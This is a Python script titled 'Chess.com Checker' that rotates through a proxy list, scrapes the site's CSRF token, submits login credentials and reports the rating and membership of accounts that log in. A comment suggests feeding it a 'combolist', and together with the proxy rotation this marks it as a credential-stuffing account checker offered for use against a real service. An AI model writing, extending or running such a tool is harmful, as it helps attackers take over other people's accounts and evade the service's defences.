import os
import requests
import re
import json
from bs4 import BeautifulSoup
# Chess.com Checker

LOGIN_URL = "https://www.chess.com/login"
LOGIN_CHECK_URL = "https://www.chess.com/login_check"
DASHBOARD_URL = "https://www.chess.com/home"
PROXY_FILE_PATH = r"ENTER YOUR PROXY FILE PATH"


USERNAME = os.getenv("CHESS_COM_USERNAME")
PASSWORD = os.getenv("CHESS_COM_PASSWORD")
#You can use combolist instead

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
}


def load_proxies(file_path):
    with open(file_path, "r") as file:
        return [line.strip() for line in file]


def get_token(session, proxies):
    for proxy in proxies:
        try:
            response = session.get(LOGIN_URL, headers=HEADERS, proxies={"http": proxy, "https": proxy}, timeout=7)
            soup = BeautifulSoup(response.text, 'html.parser')
            token_element = soup.find(id='_token')
            if token_element:
                return token_element.get('value'), proxy
        except requests.RequestException as e:
            print(f"Proxy {proxy} failed: {e}")
    raise Exception("Unable to retrieve CSRF token")


def login(session, token, proxy):
    payload = {
        "_token": token,
        "_target_path": '',
        "_username": USERNAME,
        "_password": PASSWORD,
    }
    response = session.post(LOGIN_CHECK_URL, headers=HEADERS, data=payload, proxies={"http": proxy, "https": proxy})
    return response


def extract_user_info(session):
    response = session.get(DASHBOARD_URL)
    soup = BeautifulSoup(response.text, 'html.parser')
    script_tag = soup.find('script', string=re.compile('var Config'))
    if script_tag:
        script_content = script_tag.string
        match = re.search(r'context\s*=\s*({.*?});', script_content)
        if match:
            context_json = match.group(1)
            context_data = json.loads(context_json)
            return {
                "rating": context_data["user"]["rating"],
                "membership": context_data["user"]["membershipCode"]
            }
    return None

def main():
    proxies = load_proxies(PROXY_FILE_PATH)
    session = requests.Session()
    
    try:
        token, proxy = get_token(session, proxies)
        response = login(session, token, proxy)
        
        if response.url == DASHBOARD_URL:
            print("Login Successful")
            user_info = extract_user_info(session)
            if user_info:
                print(f'Username: {USERNAME} - Rating: {user_info["rating"]} / Membership: {user_info["membership"]}')
            else:
                print("Failed to extract user information")
        else:
            print("Login Failed")
            error_message = BeautifulSoup(response.text, 'html.parser').select_one("html > body > div:nth-of-type(2) > div > main > div > p")
            if error_message:
                print(error_message.get_text())
                
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
